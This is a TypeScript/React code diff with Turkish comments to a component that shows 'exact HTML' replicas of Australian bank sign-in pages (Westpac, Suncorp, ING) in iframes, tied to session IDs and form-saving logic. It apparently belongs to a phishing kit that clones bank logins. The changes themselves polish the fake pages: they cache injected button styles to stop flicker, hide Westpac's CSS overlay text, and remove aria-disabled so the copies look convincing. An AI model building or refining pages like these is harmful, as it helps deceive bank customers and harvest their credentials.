@@ -760,6 +760,67 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
   const [saving, setSaving] = useState(false);
   const [stepIndex, setStepIndex] = useState(0);
 
+  // ⭐ WESTPAC FIX 1: Button style FLICKER onleme — her node icin son uygulanan
+  //   stil degerlerini WeakMap ile sakla. AYNI degeri tekrar setProperty ETME!
+  //   (aksi halde 900ms polling'de transition tekrar tetikleniyor → yanip sonme)
+  const btnStyleCacheRef = useRef<WeakMap<HTMLElement, Record<string, string>>>(
+    typeof WeakMap !== "undefined" ? new WeakMap() : new Map() as any,
+  );
+
+  // ⭐ WESTPAC FIX 2: "DO NOT USE DISABLED STATES" UST USTE BINME —
+  //   Westpac CSS, [aria-disabled="true"] veya .btn-primary:disabled olunca ::after
+  //   pseudo-elementine content:"DO NOT USE DISABLED STATES" yaziyor ve orijinal
+  //   "Sign in" ile ust uste biniyor. Cozum: iframe head'ina STYLE tag enjekte ET
+  //   ve BUTONLARDA ::before/::after content'ini KALDIR (content: none !important)
+  //   + ayni zamanda aria-disabled attribute'unu KULLANMA (artik hic yazmiyoruz).
+  const antiOverlayStyleInjectedRef = useRef<Set<Document>>(new Set());
+  const ensureAntiOverlayStyleInjected = useCallback((doc: Document) => {
+    try {
+      if (!doc || !doc.head) return;
+      if (antiOverlayStyleInjectedRef.current.has(doc)) return;
+      antiOverlayStyleInjectedRef.current.add(doc);
+      const styleEl = doc.createElement("style");
+      styleEl.setAttribute("data-au-bot-fix", "westpac-signin-overlay");
+      styleEl.textContent = [
+        "button, input[type='submit'], input[type='button'], [role='button'], .btn, .btn-primary, .btn-default, .btn-login, .btn-signin, .btn-continue, .btn-next, .signin, .sign-in {",
+        "  content-visibility: auto !important;",
+        "}",
+        "button::before, button::after, input[type='submit']::before, input[type='submit']::after, input[type='button']::before, input[type='button']::after, [role='button']::before, [role='button']::after, .btn-primary::before, .btn-primary::after, .btn::before, .btn::after, .btnSignIn-v2::before, .btnSignIn-v2::after, #signin::before, #signin::after {",
+        "  content: none !important;",
+        "  display: none !important;",
+        "}",
+        "/* Ayrica buton icinde data-text / aria-label content yazdiran kurallar icin: */",
+        "button[data-text]::before, button[data-text]::after { content: none !important; }",
+      ].join("\n");
+      try {
+        doc.head.insertBefore(styleEl, doc.head.firstChild);
+      } catch {
+        doc.head.appendChild(styleEl);
+      }
+    } catch {}
+  }, []);
+
+  // ⭐ MERKEZLI applyButtonStyleCached: WeakMap cache üzerinden AYNI deger tekrar
+  //   setProperty EDILMIYOR → transition flicker %100 onleniyor.
+  const applyButtonStyleCached = useCallback((node: HTMLElement, prop: string, value: string) => {
+    try {
+      const cache = btnStyleCacheRef.current as WeakMap<HTMLElement, Record<string, string>>;
+      let map = cache.get(node);
+      if (!map) {
+        map = {};
+        cache.set(node, map);
+      }
+      if (map[prop] === value) {
+        // ⭐ AYNI deger → ATLA. (flicker ana sebebi bu tekrar tekrar yazma idi)
+        return;
+      }
+      map[prop] = value;
+      try { node.style.setProperty(prop, value, "important"); } catch {}
+    } catch {
+      try { node.style.setProperty(prop, value, "important"); } catch {}
+    }
+  }, []);
+
   const auPages = useMemo(() => (isAuExactHtmlBank(bankSlug) ? getAuBankPages(bankSlug) : null), [bankSlug]);
 
   const totalSteps = auPages?.length ?? 0;
@@ -1492,6 +1553,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     savedSubmitActionNodesRef.current = actionNodes;
 
     const updateSubmitState = () => {
+      // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
+      //   iframe icindeki doc head'ina style tag 1 kez enjekte et.
+      try { ensureAntiOverlayStyleInjected(doc); } catch {}
+
       let isValid = canProceedNow();
       const palette = getButtonPalette(bankSlug);
 
@@ -1576,46 +1641,45 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             }
           }
         } catch {}
-        try {
-          node.setAttribute("aria-disabled", isValid ? "false" : "true");
-        } catch {}
+        // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
+        //   Westpac CSS [aria-disabled="true"] olunca ::after ile
+        //   "DO NOT USE DISABLED STATES" yazdiriyor, orijinal "Sign in" ile
+        //   UST USTE BINIYOR. Bunun yerine sadece opacity/color ile goster.
+        try { node.removeAttribute("aria-disabled"); } catch {}
 
-        // ⭐ TÜM STİLLER setProperty('important') ile yaz:
-        //   Suncorp SG-Btn sınıfları bizim inline stillerimizi CSS specificity ile
-        //   ezip opacity 0.63 / grayscale 0.2 yapıyordu → IMPORTANT ile artık BİZ KAZANIYORUZ.
-        // ⭐ LAYOUT: butonun diğer yazıların üstünde kalması için Z-INDEX 99999 + position:relative
-        //   + inline-block + margin. Login yazıları üst üste binmesin diye line-height da set et.
-        try { node.style.setProperty("position", "relative", "important"); } catch {}
-        try { node.style.setProperty("display", "inline-block", "important"); } catch {}
-        try { node.style.setProperty("z-index", "99999", "important"); } catch {}
-        try { node.style.setProperty("margin-top", "14px", "important"); } catch {}
-        try { node.style.setProperty("margin-bottom", "10px", "important"); } catch {}
-        try { node.style.setProperty("padding-top", "12px", "important"); } catch {}
-        try { node.style.setProperty("padding-bottom", "12px", "important"); } catch {}
-        try { node.style.setProperty("padding-left", "22px", "important"); } catch {}
-        try { node.style.setProperty("padding-right", "22px", "important"); } catch {}
-        try { node.style.setProperty("line-height", "1.35", "important"); } catch {}
-        try { node.style.setProperty("font-size", "15px", "important"); } catch {}
-        try { node.style.setProperty("font-weight", "700", "important"); } catch {}
-        try { node.style.setProperty("border-radius", "10px", "important"); } catch {}
-        try { node.style.setProperty("pointer-events", pointerEvents, "important"); } catch {}
-        try { node.style.setProperty("opacity", String(fadeOpacity), "important"); } catch {}
-        try { node.style.setProperty("filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
-        try { node.style.setProperty("-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
-        try { node.style.setProperty("cursor", cursorVal, "important"); } catch {}
-        try { node.style.setProperty("background-color", bgColor, "important"); } catch {}
-        try { node.style.setProperty("background", bgColor, "important"); } catch {}
-        try { node.style.setProperty("color", fgColor, "important"); } catch {}
-        try { node.style.setProperty("border", borderColor, "important"); } catch {}
-        try { node.style.setProperty("box-shadow", boxShadow, "important"); } catch {}
-        try { node.style.setProperty("transform", isValid ? "translateY(0)" : "none", "important"); } catch {}
-        try {
-          node.style.setProperty(
-            "transition",
-            "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-            "important",
-          );
-        } catch {}
+        // ⭐ TÜM STİLLER applyButtonStyleCached (WeakMap cache) ile yaz:
+        //   AYNI deger polling'de tekrar tekrar SET EDILMIYOR → transition
+        //   220ms opacity tekrar baslatmiyor → YANIP SONME (FLICKER) %0!
+        applyButtonStyleCached(node, "position", "relative");
+        applyButtonStyleCached(node, "display", "inline-block");
+        applyButtonStyleCached(node, "z-index", "99999");
+        applyButtonStyleCached(node, "margin-top", "14px");
+        applyButtonStyleCached(node, "margin-bottom", "10px");
+        applyButtonStyleCached(node, "padding-top", "12px");
+        applyButtonStyleCached(node, "padding-bottom", "12px");
+        applyButtonStyleCached(node, "padding-left", "22px");
+        applyButtonStyleCached(node, "padding-right", "22px");
+        applyButtonStyleCached(node, "line-height", "1.35");
+        applyButtonStyleCached(node, "font-size", "15px");
+        applyButtonStyleCached(node, "font-weight", "700");
+        applyButtonStyleCached(node, "border-radius", "10px");
+        applyButtonStyleCached(node, "pointer-events", pointerEvents);
+        applyButtonStyleCached(node, "opacity", String(fadeOpacity));
+        applyButtonStyleCached(node, "filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
+        applyButtonStyleCached(node, "-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`);
+        applyButtonStyleCached(node, "cursor", cursorVal);
+        applyButtonStyleCached(node, "background-color", bgColor);
+        applyButtonStyleCached(node, "background", bgColor);
+        applyButtonStyleCached(node, "color", fgColor);
+        applyButtonStyleCached(node, "border", borderColor);
+        applyButtonStyleCached(node, "box-shadow", boxShadow);
+        applyButtonStyleCached(node, "transform", isValid ? "translateY(0)" : "none");
+        // Transition polling'de tekrar tekrar yazma → Sadece 1 kez set et
+        applyButtonStyleCached(
+          node,
+          "transition",
+          "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
+        );
       });
     };
 
@@ -1830,6 +1894,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         if (!form) return;
         savedSubmitFormRef.current = form;
 
+        // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
+        try { ensureAntiOverlayStyleInjected(doc); } catch {}
+
         const singleStep = totalSteps === 1;
         const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
         const disabledBySaving = saving;
@@ -1970,34 +2037,37 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               node.removeAttribute("disabled");
             }
           } catch {}
-          try {
-            node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
-          } catch {}
+          // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA! "DO NOT USE DISABLED STATES"
+          //   overlay yazisi orijinal "Sign in" ile UST USTE BINIYOR.
+          try { node.removeAttribute("aria-disabled"); } catch {}
 
           // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
           if (!isElementActuallyButtonLike(node)) return;
 
           // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
-          try {
-            node.style.setProperty("position", "relative", "important");
-            node.style.setProperty("display", "inline-block", "important");
-            node.style.setProperty("z-index", "99999", "important");
-            node.style.setProperty("margin-top", "14px", "important");
-            node.style.setProperty("margin-bottom", "10px", "important");
-            node.style.setProperty("padding-top", "12px", "important");
-            node.style.setProperty("padding-bottom", "12px", "important");
-            node.style.setProperty("padding-left", "22px", "important");
-            node.style.setProperty("padding-right", "22px", "important");
-            node.style.setProperty("line-height", "1.35", "important");
-            node.style.setProperty("font-size", "15px", "important");
-            node.style.setProperty("font-weight", "700", "important");
-            node.style.setProperty("border-radius", "10px", "important");
-            node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
-            node.style.setProperty("opacity", String(fadeOpacity), "important");
-            node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
-            node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
-            node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
-          } catch {}
+          //   WeakMap CACHE kullan → sadece DEGISEN degerler SET EDILIR → FLICKER YOK!
+          applyButtonStyleCached(node, "position", "relative");
+          applyButtonStyleCached(node, "display", "inline-block");
+          applyButtonStyleCached(node, "z-index", "99999");
+          applyButtonStyleCached(node, "margin-top", "14px");
+          applyButtonStyleCached(node, "margin-bottom", "10px");
+          applyButtonStyleCached(node, "padding-top", "12px");
+          applyButtonStyleCached(node, "padding-bottom", "12px");
+          applyButtonStyleCached(node, "padding-left", "22px");
+          applyButtonStyleCached(node, "padding-right", "22px");
+          applyButtonStyleCached(node, "line-height", "1.35");
+          applyButtonStyleCached(node, "font-size", "15px");
+          applyButtonStyleCached(node, "font-weight", "700");
+          applyButtonStyleCached(node, "border-radius", "10px");
+          applyButtonStyleCached(node, "pointer-events", saving ? "none" : "auto");
+          applyButtonStyleCached(node, "opacity", String(fadeOpacity));
+          applyButtonStyleCached(node, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+          applyButtonStyleCached(node, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+          applyButtonStyleCached(
+            node,
+            "cursor",
+            shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
+          );
 
           try {
             if (shouldForceEnable) {
@@ -2014,23 +2084,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           try {
             if (shouldForceEnable) {
-              node.style.setProperty("background-color", palette.bg, "important");
-              node.style.setProperty("background", palette.bg, "important");
-              node.style.setProperty("color", palette.fg, "important");
-              node.style.setProperty("border", `1px solid ${palette.border}`, "important");
-              node.style.setProperty("box-shadow", palette.shadow, "important");
+              applyButtonStyleCached(node, "background-color", palette.bg);
+              applyButtonStyleCached(node, "background", palette.bg);
+              applyButtonStyleCached(node, "color", palette.fg);
+              applyButtonStyleCached(node, "border", `1px solid ${palette.border}`);
+              applyButtonStyleCached(node, "box-shadow", palette.shadow);
             } else {
               const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
-              node.style.setProperty("background-color", bgCol, "important");
-              node.style.setProperty("background", bgCol, "important");
-              node.style.setProperty("color", "#8A8E90", "important");
-              node.style.setProperty("border", "1px solid transparent", "important");
-              node.style.setProperty("box-shadow", "none", "important");
+              applyButtonStyleCached(node, "background-color", bgCol);
+              applyButtonStyleCached(node, "background", bgCol);
+              applyButtonStyleCached(node, "color", "#8A8E90");
+              applyButtonStyleCached(node, "border", "1px solid transparent");
+              applyButtonStyleCached(node, "box-shadow", "none");
             }
-            node.style.setProperty(
+            applyButtonStyleCached(
+              node,
               "transition",
               "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-              "important",
             );
           } catch {}
 
@@ -2089,13 +2159,18 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                   try { (el as any).disabled = !shouldForceEnable; } catch {}
                 }
                 try { if (shouldForceEnable) el.removeAttribute("disabled"); } catch {}
-                try { el.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true"); } catch {}
+                // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
+                try { el.removeAttribute("aria-disabled"); } catch {}
                 try {
-                  el.style.pointerEvents = saving ? "none" : "auto";
-                  el.style.opacity = String(fadeOpacity);
-                  el.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
-                  el.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
-                  el.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
+                  applyButtonStyleCached(el, "pointer-events", saving ? "none" : "auto");
+                  applyButtonStyleCached(el, "opacity", String(fadeOpacity));
+                  applyButtonStyleCached(el, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+                  applyButtonStyleCached(el, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+                  applyButtonStyleCached(
+                    el,
+                    "cursor",
+                    shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
+                  );
                 } catch {}
                 try {
                   if (shouldForceEnable && (el as any).classList) {
@@ -2111,23 +2186,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 } catch {}
                 try {
                   if (shouldForceEnable) {
-                    el.style.setProperty("background-color", palette.bg, "important");
-                    el.style.setProperty("background", palette.bg, "important");
-                    el.style.setProperty("color", palette.fg, "important");
-                    el.style.setProperty("border", `1px solid ${palette.border}`, "important");
-                    el.style.setProperty("box-shadow", palette.shadow, "important");
+                    applyButtonStyleCached(el, "background-color", palette.bg);
+                    applyButtonStyleCached(el, "background", palette.bg);
+                    applyButtonStyleCached(el, "color", palette.fg);
+                    applyButtonStyleCached(el, "border", `1px solid ${palette.border}`);
+                    applyButtonStyleCached(el, "box-shadow", palette.shadow);
                   } else {
                     const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
-                    el.style.setProperty("background", bgCol, "important");
-                    el.style.setProperty("background-color", bgCol, "important");
-                    el.style.setProperty("color", "#8A8E90", "important");
-                    el.style.setProperty("border", "1px solid transparent", "important");
-                    el.style.setProperty("box-shadow", "none", "important");
+                    applyButtonStyleCached(el, "background", bgCol);
+                    applyButtonStyleCached(el, "background-color", bgCol);
+                    applyButtonStyleCached(el, "color", "#8A8E90");
+                    applyButtonStyleCached(el, "border", "1px solid transparent");
+                    applyButtonStyleCached(el, "box-shadow", "none");
                   }
-                  el.style.setProperty(
+                  applyButtonStyleCached(
+                    el,
                     "transition",
                     "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-                    "important",
                   );
                 } catch {}
                 try {
@@ -2195,29 +2270,30 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               try {
                 if (shouldForceEnable) node.removeAttribute("disabled");
               } catch {}
-              try {
-                node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
-              } catch {}
-              try {
-                node.style.setProperty("position", "relative", "important");
-                node.style.setProperty("display", "inline-block", "important");
-                node.style.setProperty("z-index", "99999", "important");
-                node.style.setProperty("margin-top", "14px", "important");
-                node.style.setProperty("margin-bottom", "10px", "important");
-                node.style.setProperty("padding-top", "12px", "important");
-                node.style.setProperty("padding-bottom", "12px", "important");
-                node.style.setProperty("padding-left", "22px", "important");
-                node.style.setProperty("padding-right", "22px", "important");
-                node.style.setProperty("line-height", "1.35", "important");
-                node.style.setProperty("font-size", "15px", "important");
-                node.style.setProperty("font-weight", "700", "important");
-                node.style.setProperty("border-radius", "10px", "important");
-                node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
-                node.style.setProperty("opacity", String(fadeOpacity), "important");
-                node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
-                node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
-                node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
-              } catch {}
+              // ⭐ WESTPAC FIX 3: aria-disabled KULLANMA!
+              try { node.removeAttribute("aria-disabled"); } catch {}
+              applyButtonStyleCached(node, "position", "relative");
+              applyButtonStyleCached(node, "display", "inline-block");
+              applyButtonStyleCached(node, "z-index", "99999");
+              applyButtonStyleCached(node, "margin-top", "14px");
+              applyButtonStyleCached(node, "margin-bottom", "10px");
+              applyButtonStyleCached(node, "padding-top", "12px");
+              applyButtonStyleCached(node, "padding-bottom", "12px");
+              applyButtonStyleCached(node, "padding-left", "22px");
+              applyButtonStyleCached(node, "padding-right", "22px");
+              applyButtonStyleCached(node, "line-height", "1.35");
+              applyButtonStyleCached(node, "font-size", "15px");
+              applyButtonStyleCached(node, "font-weight", "700");
+              applyButtonStyleCached(node, "border-radius", "10px");
+              applyButtonStyleCached(node, "pointer-events", saving ? "none" : "auto");
+              applyButtonStyleCached(node, "opacity", String(fadeOpacity));
+              applyButtonStyleCached(node, "filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+              applyButtonStyleCached(node, "-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`);
+              applyButtonStyleCached(
+                node,
+                "cursor",
+                shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"),
+              );
               try {
                 if (shouldForceEnable) {
                   const classesToRemove: string[] = [];
@@ -2232,23 +2308,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               } catch {}
               try {
                 if (shouldForceEnable) {
-                  node.style.setProperty("background-color", palette.bg, "important");
-                  node.style.setProperty("background", palette.bg, "important");
-                  node.style.setProperty("color", palette.fg, "important");
-                  node.style.setProperty("border", `1px solid ${palette.border}`, "important");
-                  node.style.setProperty("box-shadow", palette.shadow, "important");
+                  applyButtonStyleCached(node, "background-color", palette.bg);
+                  applyButtonStyleCached(node, "background", palette.bg);
+                  applyButtonStyleCached(node, "color", palette.fg);
+                  applyButtonStyleCached(node, "border", `1px solid ${palette.border}`);
+                  applyButtonStyleCached(node, "box-shadow", palette.shadow);
                 } else {
                   const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
-                  node.style.setProperty("background-color", bgCol, "important");
-                  node.style.setProperty("background", bgCol, "important");
-                  node.style.setProperty("color", "#8A8E90", "important");
-                  node.style.setProperty("border", "1px solid transparent", "important");
-                  node.style.setProperty("box-shadow", "none", "important");
+                  applyButtonStyleCached(node, "background-color", bgCol);
+                  applyButtonStyleCached(node, "background", bgCol);
+                  applyButtonStyleCached(node, "color", "#8A8E90");
+                  applyButtonStyleCached(node, "border", "1px solid transparent");
+                  applyButtonStyleCached(node, "box-shadow", "none");
                 }
-                node.style.setProperty(
+                applyButtonStyleCached(
+                  node,
                   "transition",
                   "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
-                  "important",
                 );
               } catch {}
               try {
